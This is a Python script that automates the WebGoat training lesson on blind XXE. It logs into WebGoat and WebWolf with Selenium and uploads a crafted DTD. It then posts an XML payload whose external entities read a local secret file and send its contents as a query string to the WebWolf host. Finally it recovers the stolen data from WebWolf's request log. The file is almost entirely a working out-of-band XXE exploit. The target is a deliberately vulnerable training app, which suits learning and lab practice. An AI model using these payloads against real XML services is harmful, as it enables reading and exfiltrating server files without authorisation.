import json
import requests
import urllib.parse
import chromedriver_autoinstaller
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By

chromedriver_autoinstaller.install()

config = {}

with open('config.json', 'r') as config_file:
    config = json.loads(config_file.read())

WEBGOAT_USERNAME = config['webgoat_username']
WEBGOAT_PASSWORD = config['webgoat_password']
WEBGOAT_HOST = config['webgoat_host']
XXE_SECRET_LOCATION = config['secret_location']

XXE11_DTD = fr'''<?xml version="1.0" encoding="UTF-8"?>  
<!ENTITY % xxeping "<!ENTITY ping SYSTEM 'http://{WEBGOAT_HOST}:9090/landing?%secret;' >" >%xxeping;'''

XXE11_REQUEST_BODY = fr'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
    <!ENTITY % secret SYSTEM "file:///{XXE_SECRET_LOCATION}" >
    <!ENTITY % exploit SYSTEM "http://{WEBGOAT_HOST}:9090/files/{WEBGOAT_USERNAME}/xxe11_poc.dtd" > %exploit;
]>
<comment>
    <text>test&ping;</text>
</comment>'''

print(r'''
    __          __       _        _____                   _
    \ \        / /      | |      / ____|                 | |
     \ \  /\  / /  ___  | |__   | |  __    ___     __ _  | |_
      \ \/  \/ /  / _ \ | '_ \  | | |_ |  / _ \   / _' | | __|
       \  /\  /  |  __/ | |_) | | |__| | | (_) | | (_| | | |_
        \/  \/    \___| |_.__/   \_____|  \___/   \__,_|  \__|

                Automated exploit for lesson: XXE 11
''')

options = webdriver.ChromeOptions()
options.add_argument("--headless=new")
options.add_experimental_option("excludeSwitches", ["enable-logging"])

driver = webdriver.Chrome(options=options)

# Login to WebGoat
print('[*] Logging in to WebGoat...')
driver.get(f'http://{WEBGOAT_HOST}:8080/WebGoat/login')
driver.find_element('id', 'exampleInputEmail1').send_keys(WEBGOAT_USERNAME)
driver.find_element('id', 'exampleInputPassword1').send_keys(WEBGOAT_PASSWORD)
driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()

# Start XXE11 lesson
print('[*] Starting lesson XXE-11...')
driver.get(f'http://{WEBGOAT_HOST}:8080/WebGoat/start.mvc#lesson/XXE.lesson/10')

# Login to WebWolf
print('[*] Logging in to WebWolf...')
driver.get(f'http://{WEBGOAT_HOST}:9090/login')
driver.find_element('id', 'username').send_keys(WEBGOAT_USERNAME)
driver.find_element('id', 'password').send_keys(WEBGOAT_PASSWORD)
driver.find_element(By.CSS_SELECTOR, "input[type='submit']").click()

print('[*] Returning to lesson...')
driver.get(f'http://{WEBGOAT_HOST}:8080/WebGoat/start.mvc#lesson/XXE.lesson/10')

session = requests.Session()

session.cookies.set(
    name='JSESSIONID',
    value=driver.get_cookie('JSESSIONID')['value'],
    domain=WEBGOAT_HOST,
    path='/WebGoat')

session.cookies.set(
    name='WEBWOLFSESSION',
    value=driver.get_cookie('WEBWOLFSESSION')['value'],
    domain=WEBGOAT_HOST,
    path='/')

print('[*] Uploading Document Type Definition (DTD) to WebWolf...')
session.post(
    f'http://{WEBGOAT_HOST}:9090/fileupload',
    files={'file': ('xxe11_poc.dtd', XXE11_DTD)}
)
print('[+] Successfully uploaded DTD.')

print('[*] Triggering exploit...')
session.post(
    f'http://{WEBGOAT_HOST}:8080/WebGoat/xxe/blind',
    data=XXE11_REQUEST_BODY, headers={'Content-Type': 'application/xml'})
print('[+] Success!')

driver.quit()

print('[*] Retrieving request log from WebWolf...')
request_log_request = session.get(f'http://{WEBGOAT_HOST}:9090/requests')
soup = BeautifulSoup(request_log_request.text, features='html.parser')

all_pre_tags = soup.select('pre')

last_pre_tag = None

if len(all_pre_tags) > 1:
    last_pre_tag = all_pre_tags[-1]

    last_request = json.loads(last_pre_tag.get_text())

    decoded_contents = urllib.parse.unquote(last_request['request']['uri']).split('?')[-1]

    print(f'\n[+] Secret contents: {decoded_contents}')
else:
    print(f'\n[-] Could not retrieve secret contents.')
